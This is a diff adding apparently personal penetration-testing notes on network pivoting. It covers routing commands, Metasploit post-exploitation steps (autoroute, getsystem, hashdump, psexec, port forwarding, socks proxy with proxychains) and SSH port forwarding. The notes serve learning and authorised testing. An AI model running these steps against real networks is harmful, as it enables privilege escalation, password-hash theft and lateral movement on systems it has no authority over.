@@ -1,0 +1,64 @@
+Manual 
+	Linux
+		Add temporary route (until next reboot)
+			ip route add <target CIDR> via <IP of router> dev eth0
+		Add permanent route 
+			Edit /etc/sysconfig/network-scripts/route-eth0
+				<target CIDR> via <IP of router> dev eth0
+			systemctl restart network.service
+
+	Windows
+		Add temporary route (until next reboot)
+			route ADD <destination network> MASK <netmask> <gateway IP>
+		Add permanent route 
+			route -p ADD <destination network> MASK <netmask> <gateway IP>
+			
+Metasploit
+	Get meterpreter session
+	Look for other networks
+		route print
+		arp -a
+		netstat -n
+	Set autorouting for other network
+		run autoroute -s <target network CIDR>
+	See current autorouting
+			run autoroute -p 
+	Background the session
+		background
+	Scan the new network
+		search portscan
+
+	Proxychains
+
+	Compromise 1st machine
+		meterpreter> run arp_scanner -r 10.10.10.0/24
+		meterpreter> route add 10.10.10.10 255.255.255.248 <session>
+		meterpreter> use auxiliary/scanner/portscan/tcp
+		msf auxiliary(tcp)> use bind shell
+	or run autoroute:
+		meterpreter> ipconfig
+		meterpreter> run autoroute -s 10.1.13.0/24
+		meterpreter> getsystem
+		meterpreter> run hashdump
+		meterpreter> use auxiliary/scanner/portscan/tcp
+		msf auxiliary(tcp)> use exploit/windows/smb/psexec 
+	or port forwarding:
+		meterpreter> run autoroute -s 10.1.13.0/24
+		meterpreter> use auxiliary/scanner/portscan/tcp
+		msf auxiliary(tcp)> portfwd add -l <listening port> -p <remote port> -r <remote/internal host>
+	or socks proxy:
+		meterpreter> route add 10.10.10.10 255.255.255.248 <session>
+		meterpreter> use auxiliary/server/socks4a
+		# Add proxy to /etc/proxychains.conf
+		msf auxiliary(tcp)> proxychains nmap -sT -T4 -Pn 10.10.10.50
+		msf auxiliary(tcp)> setg socks4:127.0.0.1:1080
+
+
+SSH
+
+Remote forward port 222
+	ssh -R 127.0.0.1:4444:10.1.1.251:222 -p 443 root@192.168.10.118
+
+Local forward port 53
+	ssh -L 53:10.55.22.220:53 10.55.22.220 -l <username>
+
